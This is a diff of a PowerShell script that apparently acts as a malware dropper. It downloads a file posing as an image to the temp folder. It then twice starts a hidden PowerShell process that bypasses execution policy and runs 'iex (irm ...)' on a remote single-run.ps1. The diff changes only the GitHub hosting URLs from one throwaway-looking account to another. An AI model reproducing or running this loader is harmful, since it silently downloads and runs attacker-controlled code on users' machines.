@@ -1,4 +1,4 @@
-$imageUrl = "https://raw.githubusercontent.com/bigaersdifmo/test09123/refs/heads/master/image.jpg"
+$imageUrl = "https://raw.githubusercontent.com/hwkewoi391230130/helloworld/refs/heads/master/image.jpg"
 $imagePath = "$env:TEMP\image.jpg"
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
@@ -11,4 +11,4 @@ if (Test-Path $imagePath) {
 
 Start-Sleep 20
 
-Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden; Start-Sleep 25; Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://raw.githubusercontent.com/hwkewoi391230130/helloworld/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden; Start-Sleep 25; Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-w hidden -nop -ep bypass -c `"iex (irm 'https://raw.githubusercontent.com/hwkewoi391230130/helloworld/refs/heads/master/single-run.ps1')`"" -WindowStyle Hidden
